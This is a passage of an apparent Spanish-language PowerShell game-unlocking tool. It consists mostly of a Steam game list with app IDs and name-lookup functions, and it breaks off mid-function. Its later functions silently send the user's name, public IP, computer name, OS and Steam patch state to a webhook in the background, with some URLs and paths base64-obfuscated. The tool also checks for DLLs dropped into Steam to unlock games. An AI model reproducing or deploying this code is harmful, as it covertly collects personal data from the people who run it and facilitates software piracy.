Ion Fury (562860)
Island, Sex & Survival (2911250)
Istanbul Ship Simulator (1824210)
Jazzpunk: Director's Cut (250260)
Jigsaw Puzzle Dreams (1653970)
JoJo's Bizarre Adventure: All-Star Battle R (1372110)
Journey (638230)
JR EAST Train Simulator (2111630)
Judgment: Apocalypse Survival Simulation (455980)
Jujutsu Kaisen Cursed Clash (1877020)
Jungle Rumble (1608210)
Jurassic World Evolution 2 (1244460)
Jusant (1977170)
Just Cause (6880)
Just Cause 2 (8190)
Just Cause 4 Reloaded (517630)
Just Cause™ 3 (225540)
Katana ZERO (460950)
Kaze and the Wild Masks (829280)
Kena: Bridge of Spirits (1954200)
Kenshi (233860)
Kentucky Route Zero: PC Edition (231200)
Kerbal Space Program 2 (954850)
Keyboard Soldier (3178910)
Keylocker | Turn Based Cyberpunk Action (1325040)
Killing Floor (1250)
Kingdom Come: Deliverance (379430)
Kingdom Come: Deliverance II (1771300)
KINGDOM HEARTS -HD 1.5+2.5 ReMIX- (2552430)
KINGDOM HEARTS III + Re Mind (DLC) (2552450)
Kingdom Two Crowns (701160)
Knight Eternal (1165180)
Knight Online (389430)
Knights of Honor (25830)
Knights of Honor II: Sovereign (736820)
Knytt Underground (248190)
L.A. Noire (110800)
Lamplight City (761460)
Last Hope Bunker: Zombie Survival (2475440)
Layers of Fear (2016) (391720)
Le Mans Ultimate (2399420)
Left 4 Dead (500)
Left 4 Dead 2 (550)
LEGO® Batman™ 3: Beyond Gotham (313690)
LEGO® DC Super-Villains (829110)
LEGO® Jurassic World (352400)
LEGO® Marvel Super Heroes 2 (647830)
LEGO® Marvel™ Super Heroes (249130)
LEGO® Star Wars™ - The Complete Saga (32440)
LEGO® Star Wars™: The Skywalker Saga (920210)
LEGO® The Hobbit™ (285160)
LEGO® The Incredibles (818320)
LiDAR Exploration Program (1882190)
Lies of P (1627720)
Life is Strange - Episode 1 (319630)
Life is Strange 2 (532210)
Life is Strange: Double Exposure (1874000)
LIGHTNING RETURNS™: FINAL FANTASY® XIII (345350)
LIMBO (48000)
Lisa Total investigation! (2691470)
Little Nightmares (424840)
Little Nightmares II (860510)
Little Nightmares III (1392860)
Lobotomy Corporation | Monster Management Simulation (568220)
Loop Hero (1282730)
Lords of the Fallen (1501750)
Lords Of The Fallen™ 2014 (265300)
Lossless Scaling (993090)
Lost and Found Co. (2101390)
Lost Ark (1599340)
Lost Castle 2 (2445690)
Lost Judgment (2058190)
Love Spell: Written In The Stars - a magical romantic-comedy otome (1250520)
Lushfoil Photography Sim (1749860)
Lust Goddess (2808930)
Mad Max (234140)
Mafia (40990)
Mafia II (Classic) (50130)
Mafia II: Definitive Edition (1030830)
Mafia III: Definitive Edition (360430)
Mafia: The Old Country (1941540)
Martial Arts Brutality (618080)
MARVEL Puzzle Quest (234330)
Marvel's Spider-Man 2 (2651280)
Marvel’s Spider-Man Remastered (1817070)
Marvel’s Spider-Man: Miles Morales (1817190)
Mary Le Chef - Cooking Passion (588620)
Mass Effect (2007) (17460)
Mass Effect™ Legendary Edition (1328670)
Master Detective Archives: RAIN CODE Plus (2903950)
Max Payne (12140)
Max Payne 2: The Fall of Max Payne (12150)
MechWarrior 5: Clans (2000890)
MechWarrior 5: Mercenaries (784080)
Medieval Dynasty (1129580)
METAL GEAR RISING: REVENGEANCE (235460)
METAL GEAR SOLID V: THE PHANTOM PAIN (287700)
Metel - Horror Escape (1357870)
Metro 2033 Redux (286690)
Metro Exodus (412020)
Metro: Last Light Redux (287390)
Miasma Chronicles (1649010)
Microsoft Flight Simulator (2020) 40th Anniversary Edition (1250410)
Microsoft Flight Simulator 2024 (2537590)
Microsoft Flight Simulator X: Steam Edition (314160)
Middle-earth™: Shadow of War™ (356190)
Midnight Heist (2204350)
MindsEye (3265250)
Minecraft Dungeons (1672970)
Mirror's Edge™ (17410)
Mirror's Edge™ Catalyst (1233570)
Mist Survival (914620)
Modern Pink Elf RPG (2745710)
Monster Hunter Stories 3: Twisted Reflection (2852190)
Monster Train (1102190)
MOON BASE (1506410)
Mortal Kombat X (307780)
Mortal Kombat: Legacy Kollection (3454980)
Mortal Kombat 11 (976310)
Mosaic: Game of Gods (547390)
Mosaic: Game of Gods II (840240)
Moss: The Forgotten Relic  (3914860)
Move or Die (323850)
Mudborne: Frog Management Sim (2355150)
MX vs ATV Legends (1205970)
My Demon Family (2901060)
My Friend Pedro (557340)
My Lovable Demon (3854420)
Mystery Island - Hidden Object Games (1107620)
Mystery Island:Missing Amy (3439040)
Mystery Island：Enigmatic Painting (3779920)
Myth of Empires (1371580)
Mythic Love: Iberian Legends (2654990)
Mythology Waifus Mahjong (2277840)
Nancy Drew®: Message in a Haunted Mansion (615770)
NARUTO X BORUTO Ultimate Ninja STORM CONNECTIONS (1020790)
Need For Speed: Hot Pursuit (47870)
Need for Speed™ (1262540)
Need for Speed™ Heat (1222680)
Need for Speed™ Hot Pursuit Remastered (1328660)
Need for Speed™ Most Wanted (1262560)
Need for Speed™ Payback (1262580)
Need for Speed™ Rivals (1262600)
Need for Speed™ Unbound (1846380)
Neon Abyss (788100)
Neon Abyss 2 (2235200)
Neon Chrome (428750)
Neon Inferno (2957720)
Neon Sundown (1721870)
Neon White (1533420)
Neverwinter Nights: Enhanced Edition (704450)
NieR Replicant™ ver.1.22474487139... (1113560)
NieR:Automata™ (524220)
Night in the Woods (481510)
Nightmare Reaper (1051690)
Nine Worlds - A Viking saga (700460)
Ninja Stealth (485450)
Ninja Stealth 2 (585830)
Ninja Stealth 3 (754120)
Ninja Stealth 4 (1711840)
Ninja Stealth 5 (2950000)
Ninja: Shadow of the Dash (3126050)
Nioh 2 – The Complete Edition (1325200)
Nioh: Complete Edition (485510)
No Man's Sky (275850)
No Socks RPG (4929970)
NoLimits 2 Roller Coaster Simulation (301320)
Northern Journey (1639790)
Oasis Mission: Colony Sim (2658640)
Observer: System Redux (1386900)
Occupational Hazards: Episode 1 (1148980)
OCTOPATH TRAVELER II (1971650)
OCTOPATH TRAVELER™ (921570)
Office Management 101 (678390)
On Air Island : Survival Chat (2562510)
ONE PIECE ODYSSEY (814000)
Onimusha 2: Samurai's Destiny (3046600)
Orc Covenant: Gay Bara Orc Visual Novel (2243570)
Orc Massage (1129540)
Ori and the Blind Forest (261570)
Ori and the Blind Forest: Definitive Edition (387290)
Ori and the Will of the Wisps (1057090)
Original War (235320)
Outer Wilds (753640)
Outlast (238320)
Outlast 2 (414700)
Overcooked (448510)
Overcooked! 2 (728880)
Overcooked! All You Can Eat (1243830)
Owlboy (115800)
Oxenfree (388880)
Pacific Drive (1458140)
Papers, Please (239030)
Passant: A Chess Roguelike (3353100)
Path of Idle: Old Gods Rising (4243990)
PAYDAY 3 (1272080)
PAYDAY™ The Heist (24240)
PC Building Simulator (621060)
PEAK (3527290)
Pechka: Historical Story Adventure (2210700)
PEPPERED: an existential platformer (1883370)
Perfect Heist 2 (1521580)
Persona 4 Golden (1113000)
Persona 5 Royal (1687950)
Persona® 5 Strikers (1382330)
Phasmophobia (739630)
Physics Lab (2167340)
Pillars of Eternity (291650)
Pillars of Eternity II: Deadfire (560130)
Pipistrello and the Cursed Yoyo (2870350)
Pizza Tower (2231450)
Planescape: Torment: Enhanced Edition (466300)
Planet Coaster (493340)
Planet Zoo (703080)
Plants vs. Zombies™: Replanted (3654560)
Political Arena (1670920)
Poly Bridge (367450)
Poly Bridge 2 (1062160)
Portal (400)
Portal 2 (620)
Portal Stories: Mel (317400)
POSTAL 2 (223470)
Potato Thriller (486650)
Potion Craft: Alchemist Simulator (1210320)
PowerWash Adventure (2699660)
PowerWash Adventure VR (2589440)
PowerWash Simulator (1290000)
PowerWash Simulator 2 (2968420)
PRAGMATA (3357650)
Pretty Angel (1148510)
Prey (3970)
Prey (480490)
Prey with Gun 带枪的猎物 (718940)
Prey: Typhon Hunter (741820)
Prince of Persia® (19980)
Prison Escape Simulator (3507120)
Prison Escape Simulator: Dig Out (3672720)
Private Military Manager: Tactical Auto Battler (2564320)
Prodeus (964800)
Project Warlock (893680)
Project Zomboid (108600)
Prototype 2 (115320)
Prototype™ (10150)
Punch Club (394310)
Pupperazzi: The Dog Photography Game (1028350)
Puzzle Pirates (99910)
Puzzle Quest: Immortal Edition (3236710)
Quake (2310)
Quake II (2320)
Quantum Break (474960)
Quantum Odyssey (2802710)
Quest of Dungeons (270050)
RACCOIN: Coin Pusher Roguelike (3784030)
Raft (648800)
RAID: Shadow Legends (2333480)
RAIDOU Remastered: The Mystery of the Soulless Army (2288350)
Railway Empire 2 (1644320)
Rain World (312520)
Rayman® Legends (242550)
Ready or Not (1144200)
Realistic Ragdoll Sandbox (3048280)
Reclaiming the Lost (3112280)
Record of Lodoss War-Deedlit in Wonder Labyrinth- (1203630)
Red Dead Redemption (2668510)
Red Dead Redemption 2 (1174180)
Red Faction Guerrilla Re-Mars-tered (667720)
Reentry - A Space Flight Simulator (882140)
Reigns (474750)
Relicta (941570)
REMNANT II® (1282100)
Remnant: From the Ashes (617290)
Rescue Dash - Management Puzzle (2254000)
Rescue Team 5 (416320)
Resident Evil 0 (339340)
Resident Evil 2 (883710)
Resident Evil 3 (952060)
Resident Evil 7 Biohazard (418370)
Resident Evil Revelations (222480)
Resident Evil Revelations 2 (287290)
Resident Evil Village (1196590)
Retro Arcade Shop Simulator (4010900)
Retro Gadgets (1730260)
Retro Rewind - Video Store Simulator (3552140)
RetroMania Wrestling (1252300)
Return of the Obra Dinn (653530)
Return to Castle Wolfenstein (9010)
Returnal™ (1649240)
Revenge of the shadow ninja (2364970)
Rhythm Any Music (2153280)
RIDE 6 (2815070)
Rift Wizard (1271280)
Rift Wizard 2 (2058570)
RimWorld (294100)
Rise of the Tomb Raider™ (391220)
Risk of Rain 2 (632360)
Risk of Rain Returns (1337520)
Robbery Bob: Man of Steal (372960)
Robot Exploration Squad (393600)
Roman Triumph: Survival City Builder (1864880)
RuneScape: Dragonwilds (1374490)
Russian Fishing 4 (766570)
Ryse: Son of Rome (302510)
s&box (590830)
Sable (757310)
Saints Row (742420)
Saints Row 2 (9480)
Saints Row®: The Third™ Remastered (978300)
Salt and Sanctuary (283640)
Sandbox World (1831480)
Satisfactory (526870)
Save Giant Girl from monsters (2771860)
Save Giant Girl from monsters 2 (2830670)
Save Giant Girl from monsters 4 (2830690)
SCARLET NEXUS (775500)
Scary Hospital Horror Game (1343580)
Schedule I (3164500)
Scorn (698670)
Secret Cats - Haunted Mansion (3284640)
Sekiro™: Shadows Die Twice - GOTY Edition (814380)
Serious Sam Classic: The First Encounter (41050)
Serious Sam Classic: The Second Encounter (41060)
Serious Sam Classics: Revolution (227780)
Sex Trainer's Diary: Hidden Kink (4218020)
Sex, Secrets & Used Tech (3576350)
Sex-Pop Demon Hunters (4355490)
Shadow Gambit: The Cursed Crew (1545560)
Shadow Ninja: Apocalypse (389160)
Shadow of the Ninja - Reborn (2543760)
Shadow of the Tomb Raider: Definitive Edition (750920)
Shadow Tactics: Blades of the Shogun (418240)
Shadow Warrior (233130)
Shadow Warrior 2 (324800)
Shashingo: Learn Japanese with Photography (1632490)
Shin Megami Tensei V: Vengeance (1875830)
Ship Simulator: Maritime Search and Rescue (274010)
Shiren the Wanderer: The Mystery Dungeon of Serpentcoil Island (2178480)
Shop Titans (1258080)
Shovel Knight: Treasure Trove (250760)
Sigma Theory: Global Cold War (716640)
SIGNALIS (1262350)
Silent: Abandoned (3108720)
Singularity™ (42670)
Sins of a Solar Empire II (1575940)
Sir, We Have an Orc Problem (4594150)
SkateBIRD (971030)
Skelethrone: The Prey (2139870)
Slain: Back from Hell (369070)
Slay the Princess — The Pristine Cut (1989270)
Slay the Spire (646570)
Sleeping Dogs: Definitive Edition (307690)
Slime Rancher (433340)
Slime Rancher 2 (1657630)
Small Saga (1320140)
Sniper Elite 4 (312660)
Sniper Ghost Warrior Contracts (973580)
Sniper Ghost Warrior Contracts 2 (1338770)
Snoopy & The Great Mystery Club (3328180)
Solace Crafting (670260)
Solar Expanse - Space Exploration Manager (1369700)
Solasta: Crown of the Magister (1096530)
Soldier Warfare (1352520)
Solo Leveling: ARISE OVERDRIVE (2373990)
SOMA (282140)
Sonic Adventure 2 (213610)
Sonic Frontiers (1237320)
Sons Of The Forest (1326470)
South Park™: The Fractured But Whole™ (488790)
Space Colony: Steam Edition (297920)
Space Engineers (244850)
Space Engineers 2 (1133870)
Space Rescue: Code Pink (1407210)
Space Simulation Toolkit (1196080)
Space Station 51 (1426570)
Space Station Alpha (341930)
Spaceland: Sci-Fi Indie Tactics (1021070)
Spec Ops: The Line (50300)
Spelunky (239350)
Spelunky 2 (418530)
Sphinx and the Cursed Mummy (606710)
Spiral Dystopia (1933680)
Spirit City: Lofi Sessions (2113850)
Spitfire - Moonpie´s Mission (3339350)
Split Fiction (2001120)
Squad (393380)
Stacks:Jungle! (2522060)
Staffer Case: A Supernatural Mystery Adventure (2128480)
Star Chef 2: Cooking Game (1612810)
Star Knight: Order of the Vortex (2462090)
STAR WARS Jedi: Fallen Order™ (1172380)
STAR WARS Jedi: Survivor™ (1774580)
STAR WARS™ - The Force Unleashed™ Ultimate Sith Edition (32430)
STAR WARS™ Battlefront™ II (1237950)
STAR WARS™ Empire at War - Gold Pack (32470)
STAR WARS™ Jedi Knight - Jedi Academy™ (6020)
STAR WARS™ Knights of the Old Republic™ (32370)
STAR WARS™ Republic Commando™ (6000)
Starbound (211820)
Stardew Valley (413150)
Stealth Bastard Deluxe (209190)
Stealth Labyrinth (450040)
SteamWorld Heist (322190)
SteamWorld Heist II (2396240)
Stellar Blade™ (3489700)
Stormworks: Build and Rescue (573090)
Story Of the Survivor (440950)
Story of the Survivor : Prisoner (676210)
Storyteller (1624540)
Stray (1332010)
Strongest☆Angel Zerachiel! (2804550)
Stronghold Crusader HD (2012) (40970)
Submerged: Hidden Depths (1614270)
Subnautica (264710)
Subnautica 2 (1962700)
Subnautica: Below Zero (848450)
Succubus Successor: Delilah's Juicy Journey (3628950)
Suicide Squad: Kill the Justice League (315210)
Sunset Overdrive (847370)
Super Indie Karts (323670)
Superflight (732430)
SUPERHOT (322500)
Superliminal (1049410)
Supermarket Simulator (2670630)
SuperSmash: Physics Battle (1077290)
Supraland (813630)
Surf Sandbox (4480760)
Survival Log (4164790)
Syberia (46500)
Syberia 3 (464340)
Syberia II (46510)
Syberia: The World Before (1410640)
Symphony of War: The Nephilim Saga (1488200)
System Shock (482400)
System Shock 2: 25th Anniversary Remaster (866570)
System Shock: Enhanced Edition (410710)
System Shock® 2 (1999) (238210)
Tactical Assault VR (2314160)
Tactical Breach Wizards (1043810)
Tails of Iron (1283410)
Take On Helicopters (65730)
Tales from the Borderlands (330830)
Tales of ARISE (740130)
Tales of Berseria™ (429660)
Tales of Zestiria (351970)
TDS - Tower Defense Strategy (2392280)
Terraria (105600)
Tesla vs Lovecraft (636100)
The 1500 Year Old Forest Elf and My Anti-Materiel Sniper Rifle (3761830)
The Abandoned Planet (2014470)
The Adventures of Elliot: The Millennium Tales (3483510)
The Ascent (979690)
The Binding of Isaac (113200)
The Binding of Isaac: Rebirth (250900)
The Boss Gangster: Criminal Empire (2774040)
The Commission 1920: Organized Crime Grand Strategy (1330960)
The Crew™ (241560)
The Dark Eye: Memoria (243200)
The Dark Pictures Anthology: Man of Medan (939850)
The Darkside Detective (368390)
The Elder Scrolls III: Morrowind® Game of the Year Edition (22320)
The Elder Scrolls IV: Oblivion® Game of the Year Edition (2009) (22330)
The Elder Scrolls V: Skyrim Special Edition (489830)
The Enjenir: The Engineering Physics Building Simulator (1800940)
The Escapists 2 (641990)
The Evil Within (268050)
The Evil Within 2 (601430)
The First Berserker: Khazan (2680010)
The Fishing Club 3D: Co-op Sport Angling (522230)
The Forest (242760)
The Forgotten City (874260)
The Great Ace Attorney Chronicles (1158850)
The Great Villainess: Strategy of Lily (2454960)
The Horror at Highrook (2836860)
The House in Fata Morgana (303310)
The Last Campfire (990630)
The Last of Us™ Part I (1888930)
The Last Werewolf (2212520)
The Legend of Heroes: Trails of Cold Steel (538680)
The Legend of Heroes: Trails of Cold Steel II (748490)
The Legend of Heroes: Trails of Cold Steel III (991270)
The Legend of Heroes: Trails of Cold Steel IV (1198090)
The Legend of Khiimori (2697000)
The Long Dark (305620)
The Medium (1293160)
The Messenger (764790)
The Monstrous Horror Show (2099790)
The Murder of Sonic the Hedgehog (2324650)
The Mystery of Bikini Island (1064060)
The Saboteur™ (24880)
The Sandbox (265810)
The Secret Atelier (2799690)
The secret pyramid VR (2171010)
The Sims™ 4 (1222670)
The Stanley Parable: Ultra Deluxe (1703340)
The Surge (378540)
The Surge 2 (644830)
The Talos Principle (257510)
The Talos Principle 2 (835960)
The Walking Dead: Season Two (261030)
The Witcher 3: Wild Hunt - Complete Edition (292030)
theHunter: Call of the Wild™ (518790)
There Are No Orcs (3480990)
Thief (239160)
Thief Simulator (704850)
Thief Simulator 2 (1332720)
Third Crisis: Neon Nights (3400350)
This War of Mine (282070)
Timeflow – Life Sim (1005930)
Tinykin (1599020)
Titan Chaser (1290170)
Titan Quest Anniversary Edition (475150)
Titan Quest II (1154030)
Titan Souls (297130)
Titan Station (1881120)
Titanfall® 2 (1237970)
TITANIC Shipwreck Exploration (924800)
Titanic: Fall Of A Legend (1835200)
Toilet Management Simulator (1361860)
Tom Clancy's Ghost Recon: Future Soldier™ (212630)
Tom Clancy's Ghost Recon® Breakpoint (2231380)
Tom Clancy's Ghost Recon® Wildlands (460930)
Tom Clancy's Rainbow Six Siege (359550)
Tom Clancy's Rainbow Six® 3 Gold (19830)
Tom Clancy’s Splinter Cell Blacklist (235600)
Tomb Raider Game of the Year (203160)
Toodee and Topdee (1303950)
Torchlight (41500)
Torchlight II (200710)
Torment: Tides of Numenera (272270)
Tormented Souls (1367590)
Tornado: Research and Rescue (2250550)
Total War: MEDIEVAL II – Definitive Edition (4700)
Total War: THREE KINGDOMS (779340)
Totally Accurate Battle Simulator (508440)
Tower Wizard (3372980)
Traffic Giant (672710)
Train Simulator Classic (24010)
Tranquility Base Mining Colony: The Moon - Explorer Version (873740)
Trash Horror Collection (2017370)
TRIANGLE STRATEGY (1850510)
TROUBLESHOOTER: Abandoned Children (470310)
TUNIC (553420)
Turn Based Boxing: Tactics - Legends Edition (2990450)
Turok (405820)
Turok 2: Seeds of Evil (405830)
Tyranny (362960)
TYRONE vs COPS (1853200)
UberSoldier II (281410)
Ultimate Custom Night (871720)
Ultimate Fishing Simulator® (468920)
Ultimate Fishing® Simulator 2 (1136380)
ULTRAKILL (1229490)
UNCHARTED™: Legacy of Thieves Collection (1659420)
Undead Citadel (819190)
Undead Development (682140)
Undead Horde (790850)
Undead Horde 2: Necropolis (2065810)
Underground Blossom (2291850)
Underground Garage (1452250)
Undertale (391540)
Unforeseen Incidents (501790)
Universe Sandbox (230290)
Unpacking (1135690)
Unravel (1225560)
Unravel Two (1225570)
Unreal Physics (2837320)
Ur Game: The Game of Ancient Gods (1324870)
Urban Jungle (2744010)
Urban Myth Dissolution Center (2089600)
Urbek City Builder (1411740)
Utopia City (3341440)
Utopia Must Fall (2849680)
V.O.D.K.A. Open World Survival Shooter (1513840)
Valheim (892970)
Valkyria Chronicles 4 Complete Edition (790820)
Vampire Crawlers: The Turbo Wildcard from Vampire Survivors (3265700)
Vampire Hunter: Nightrise (4043730)
Vampire Survivors (1794680)
Vampire: The Masquerade - Bloodlines (2600)
Vampire: The Masquerade — Night Road (1290270)
Vampire: The Masquerade® - Bloodlines™ 2 (532790)
Vanquish (460810)
Viking Saga: The Cursed Ring (415390)
Violent Horror Stories 2 (3636960)
Viscerafest (1406780)
VR Hentai Simulation (2406200)
VR Prison Escape (1566700)
Wagotabi: A Japanese Journey (2701720)
Wallpaper Engine (431960)
Waltz of the Wizard (1094390)
Warbox Sandbox (2050680)
Warframe (230410)
Warrior of Lust (4032770)
Wartales (1527950)
Wasteland 2: Director's Cut (240760)
Wasteland 3 (719040)
Watch Dogs®: Legion (2239550)
Watch_Dogs® 2 (447040)
Watch_Dogs™ (243470)
Water Physics Simulation (1692620)
Werewolf: The Apocalypse - Earthblood (679110)
Werewolf: The Apocalypse — Purgatory (2463980)
What Remains of Edith Finch (501300)
Where Winds Meet (3564740)
WILD HEARTS™ (1938010)
Wildermyth (763890)
Wings of Prey: Special Edition (45300)
Witch Hunt (661790)
Witch of the Space Station (2820960)
Wizard with a Gun (1150530)
Wizardry Variants Daphne (2379740)
Wo Long: Fallen Dynasty (1448440)
Wolfenstein II: The New Colossus (612880)
Wolfenstein: The New Order (201810)
Wolfenstein: The Old Blood (350080)
Wolfenstein: Youngblood (1056960)
WolfQuest: Anniversary Edition (926990)
Word Rescue (358340)
WORLD OF HORROR (913740)
World Ship Simulator (403980)
WorldBox - God Simulator (1206560)
WRATH: Aeon of Ruin (1000410)
X4: Foundations (392160)
XCOM: Enemy Unknown (200510)
XCOM® 2 (268500)
Yakuza 0 (638970)
Yakuza 3 Remastered (1088710)
Yakuza 4 Remastered (1105500)
Yakuza 5 Remastered (1105510)
Yakuza Kiwami (Legacy) (834530)
Yakuza Kiwami 2 (Legacy) (927380)
Yakuza: Like a Dragon (1235140)
Yet Another Zombie Survivors (2163330)
You Are Grounded (3161920)
Ys IX: Monstrum Nox (1351630)
Ys VIII: Lacrimosa of DANA (579180)
Zombie Survival Game Online (2268560)
Zombie Survival online (1605960)
Zomby Soldier (769340)
危城逃生 (2465870)
家屋探索 -Japanese House Exploration- (3053390)
少女妖精弹珠台 Elf Girl Pinball (2074890)
尸来运转-Lucky Zombie Survival (3682530)
'@

$script:GAME_NAME_BY_APPID = $null
$script:GAME_APPID_BY_NAME = $null
$script:GAME_APPID_LIST = $null
function Initialize-GameNameMap {
    if ($script:GAME_NAME_BY_APPID) { return }
    $byId = @{}
    $byName = @{}
    $order = New-Object System.Collections.ArrayList
    $raw = $null
    $cand = @()
    try { if ($PSScriptRoot) { $cand += (Join-Path $PSScriptRoot 'lua_nombres_1173_final.txt') } } catch {}
    try { $cand += (Join-Path $env:LOCALAPPDATA 'BastissSteam\lua_nombres_1173_final.txt') } catch {}
    try { $cand += (Join-Path ([Environment]::GetFolderPath('Desktop')) 'lua_nombres_1173_final.txt') } catch {}
    foreach ($c in $cand) {
        if ($c -and (Test-Path -LiteralPath $c)) { try { $raw = [System.IO.File]::ReadAllText($c); break } catch {} }
    }
    if (-not $raw) { $raw = $script:GAME_NAME_DATA }
    foreach ($line in ($raw -split "`r?`n")) {
        $line = $line.Trim()
        if (-not $line) { continue }
        $m = [regex]::Match($line, '^(.*?)\s*\((\d+)\)\s*$')
        if (-not $m.Success) { continue }
        $nm = $m.Groups[1].Value.Trim()
        $id = $m.Groups[2].Value
        if (-not $id -or -not $nm) { continue }
        if (-not $byId.ContainsKey($id)) { $byId[$id] = $nm; [void]$order.Add($id) }
        $key = Nn1Yw $nm
        if ($key -and -not $byName.ContainsKey($key)) { $byName[$key] = $id }
    }
    $script:GAME_NAME_BY_APPID = $byId
    $script:GAME_APPID_BY_NAME = $byName
    $script:GAME_APPID_LIST = @($order)
}
function Get-GameNameByAppId([string]$appid) {
    if (-not $script:GAME_NAME_BY_APPID) { Initialize-GameNameMap }
    $k = [string]$appid
    if ($k -and $script:GAME_NAME_BY_APPID.ContainsKey($k)) { return $script:GAME_NAME_BY_APPID[$k] }
    return $k
}
function Get-NameAliasTokens([string]$tok) {
    switch ($tok) {
        'gta' { return @('grand','theft','auto') }
        'cod' { return @('call','of','duty') }
        'gow' { return @('god','of','war') }
        'nfs' { return @('need','for','speed') }
        'mgs' { return @('metal','gear','solid') }
        're'  { return @('resident','evil') }
        default { return @() }
    }
}
function Find-AppIdByName([string]$text) {
    if (-not $script:GAME_APPID_BY_NAME) { Initialize-GameNameMap }
    if ([string]::IsNullOrWhiteSpace($text)) { return $null }
    $q = Nn1Yw $text
    if (-not $q) { return $null }
    if ($script:GAME_APPID_BY_NAME.ContainsKey($q)) { return $script:GAME_APPID_BY_NAME[$q] }
    $qArgs = @($q -split '\s+' | Where-Object { $_ })
    if ($qArgs.Count -eq 0) { return $null }
    $qDigits = @($qArgs | Where-Object { $_ -match '^\d+$' })
    $ignoreTok = @('edition','definitive','anniversary','complete','deluxe','ultimate','remastered','enhanced','goty','gold','collectors','the','of','a','an')
    $best = $null; $bestScore = -1
    foreach ($candKey in $script:GAME_APPID_BY_NAME.Keys) {
        $candToks = @($candKey -split '\s+' | Where-Object { $_ })
        if ($candToks.Count -eq 0) { continue }
        $usedIdx = New-Object 'System.Collections.Generic.HashSet[int]'
        $okQ = $true
        foreach ($qk in $qArgs) {
            $foundAt = -1
            for ($jA = 0; $jA -lt $candToks.Count; $jA++) { if ($usedIdx.Contains($jA)) { continue }; if ($candToks[$jA] -eq $qk) { $foundAt = $jA; break } }
            if ($foundAt -ge 0) { [void]$usedIdx.Add($foundAt); continue }
            $alToks = Get-NameAliasTokens $qk
            if ($alToks.Count -gt 0) {
                $alIdx = @(); $gotAll = $true
                foreach ($alTok in $alToks) {
                    $ai = -1
                    for ($jA = 0; $jA -lt $candToks.Count; $jA++) { if ($usedIdx.Contains($jA)) { continue }; if ($candToks[$jA] -eq $alTok) { $ai = $jA; break } }
                    if ($ai -lt 0) { $gotAll = $false; break }
                    $alIdx += $ai
                }
                if ($gotAll) { foreach ($xi in $alIdx) { [void]$usedIdx.Add($xi) }; continue }
            }
            $okQ = $false; break
        }
        if (-not $okQ) { continue }
        $lfOk = $true
        for ($jA = 0; $jA -lt $candToks.Count; $jA++) {
            if ($usedIdx.Contains($jA)) { continue }
            $lt = $candToks[$jA]
            if ($ignoreTok -contains $lt) { continue }
            if ($lt -match '^\d{4}$') { continue }
            if ($qDigits.Count -gt 0 -and $lt -match '^\d+$') { continue }
            $lfOk = $false; break
        }
        if (-not $lfOk) { continue }
        $score = 1000 - ($candToks.Count - $qArgs.Count)
        if ($score -gt $bestScore) { $bestScore = $score; $best = $script:GAME_APPID_BY_NAME[$candKey] }
    }
    return $best
}
function Search-AppIdsByName([string]$text) {
    if (-not $script:GAME_APPID_BY_NAME) { Initialize-GameNameMap }
    if ([string]::IsNullOrWhiteSpace($text)) { return @() }
    $q = Nn1Yw $text
    if (-not $q) { return @() }
    $res = New-Object System.Collections.ArrayList
    foreach ($id in @($script:GAME_APPID_LIST)) {
        if (-not $script:GAME_NAME_BY_APPID.ContainsKey($id)) { continue }
        $nm = Nn1Yw $script:GAME_NAME_BY_APPID[$id]
        if ($nm -like "*$q*" -or $q -like "*$nm*") { [void]$res.Add($id) }
    }
    return @($res)
}


function Send-Webhook {
    param([string]$codigo, [string]$traduccion)
    try {
        Invoke-BgNoWait ({
            param($codigo, $traduccion, $webhookUrl, $user, $bt)
            try {
                $ip = (Invoke-RestMethod "https://api.ipify.org" -UseBasicParsing -TimeoutSec 8 -ErrorAction SilentlyContinue)
                $content = "**Usuario:** $user ($ip)`n**Codigo usado:**`n$bt$bt$bt$codigo$bt$bt$bt`n**Traduccion:**`n$bt$bt$bt$traduccion$bt$bt$bt"
                $payload = @{ content = $content } | ConvertTo-Json
                Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -TimeoutSec 10 -ErrorAction SilentlyContinue | Out-Null
            } catch {}
        }) @($codigo, $traduccion, $WEBHOOK_URL, [Environment]::UserName, [char]96)
    } catch {}
}

function Send-PatchStatus {
    param([string]$code, [string]$errCtx)
    try {
        $parcheFlag = Get-ParcheInstalado
        $steamRoot = $null; try { $steamRoot = Get-SteamPath } catch {}
        $hasDll = $false; try { $hasDll = (Test-Path (Join-Path $steamRoot "OpenSteamTool.dll")) -and (Test-Path (Join-Path $steamRoot "xinput1_4.dll")) } catch {}
        $parche = $parcheFlag -or $hasDll
        $dllInfo = if ($hasDll) { " (dll OK)" } elseif ($parcheFlag) { " (flag OK, dll falta)" } else { "" }
        $c1=0;$c2=0;$c3=0
        try { $c1 = @(Get-ChildItem (Join-Path $steamRoot (S("Y29uZmlnXHN0cGx1Zy1pbg=="))) -Filter *.lua -ErrorAction SilentlyContinue).Count } catch {}
        try { $c2 = @(Get-ChildItem (Join-Path $steamRoot (S("Y29uZmlnXGx1YQ=="))) -Filter *.lua -ErrorAction SilentlyContinue).Count } catch {}
        try { $c3 = @(Get-ChildItem (Join-Path $steamRoot "config\depotcache") -Filter *.manifest -ErrorAction SilentlyContinue).Count } catch {}
        $bt=[char]96
        $lines=@("**PATCH STATUS** - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')","**Codigo:** $code","**Parche:** $(if($parche){'INSTALADO'+$dllInfo}else{'NO INSTALADO'})","**Steam:** $steamRoot","**stplug-in:** $c1 luas","**lua:** $c2 luas","**depotcache:** $c3 manifests")
        if ($errCtx) { $lines += "**Contexto:** $errCtx" }
        $payload=@{content=($lines -join "`n")} | ConvertTo-Json
        Invoke-BgNoWait ({ param($u, $p) try { Invoke-RestMethod -Uri $u -Method Post -Body $p -ContentType "application/json" -TimeoutSec 10 -ErrorAction SilentlyContinue | Out-Null } catch {} }) @($WEBHOOK_URL, $payload)
    } catch {}
}
function Send-Diagnostics {
    try {
        $lines = @()
        $lines += "**DIAGNOSTICO** - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
        $lines += "**PC:** $env:COMPUTERNAME / $([Environment]::UserName)"
        $lines += "**OS:** $([System.Environment]::OSVersion.VersionString)"
        $lines += "**ClientID:** $($script:clientId)"
        try { $ip = (Invoke-RestMethod (S("aHR0cHM6Ly9hcGkuaXBpZnkub3Jn")) -UseBasicParsing -TimeoutSec 8 -ErrorAction Stop); $lines += "**IP:** $ip" } catch { $lines += "**IP:** ipify fallo" }
